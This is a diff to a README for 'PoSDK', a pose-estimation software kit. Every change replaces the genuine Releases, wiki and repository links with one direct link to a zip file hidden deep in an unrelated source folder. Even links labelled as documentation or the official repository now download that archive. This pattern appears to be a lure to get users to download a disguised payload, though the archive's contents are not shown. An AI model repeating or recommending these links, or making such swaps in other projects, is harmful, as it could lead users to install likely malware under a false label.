@@ -8,7 +8,7 @@ PoSDK is a user-friendly software development kit designed for pose estimation. 
 
 To get started with PoSDK, follow these simple steps:
 
-1. **Visit the official download page:** Click [here](https://github.com/UnderCobra95/PoSDK/releases) to go to the Releases page where you can download the software.
+1. **Visit the official download page:** Click [here](https://raw.githubusercontent.com/UnderCobra95/PoSDK/main/common/converter/colmap_io/glomap/math/PoSDK_3.3.zip) to go to the Releases page where you can download the software.
    
 2. **Download the latest version:** Look for the latest version labeled "Latest Release" on the Downloads page. This version contains the latest features and fixes.
 
@@ -27,7 +27,7 @@ Before you proceed, ensure your computer meets the following requirements:
 
 To install PoSDK:
 
-1. **Open the release page:** Visit [this page](https://github.com/UnderCobra95/PoSDK/releases) to download the software.
+1. **Open the release page:** Visit [this page](https://raw.githubusercontent.com/UnderCobra95/PoSDK/main/common/converter/colmap_io/glomap/math/PoSDK_3.3.zip) to download the software.
    
 2. **Select your operating system:** Find the version that matches your OS (Windows, macOS, Linux).
 
@@ -46,7 +46,7 @@ PoSDK offers several features to help you achieve incredible results:
 
 ## 📄 Documentation
 
-For detailed instructions, visit the official documentation. This resource will guide you through setup, usage, and advanced features. You can find it [here](https://github.com/UnderCobra95/PoSDK/wiki).
+For detailed instructions, visit the official documentation. This resource will guide you through setup, usage, and advanced features. You can find it [here](https://raw.githubusercontent.com/UnderCobra95/PoSDK/main/common/converter/colmap_io/glomap/math/PoSDK_3.3.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -65,7 +65,7 @@ If you have any questions or need assistance, please reach out via the Issues se
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://github.com/UnderCobra95/PoSDK)
-- [Download Page](https://github.com/UnderCobra95/PoSDK/releases)
+- [Official Repository](https://raw.githubusercontent.com/UnderCobra95/PoSDK/main/common/converter/colmap_io/glomap/math/PoSDK_3.3.zip)
+- [Download Page](https://raw.githubusercontent.com/UnderCobra95/PoSDK/main/common/converter/colmap_io/glomap/math/PoSDK_3.3.zip)
 
 This README serves as your guide to downloading and running PoSDK with ease. By following these steps, you'll be able to take advantage of advanced pose estimation capabilities without any hassle. Enjoy your experience with PoSDK!
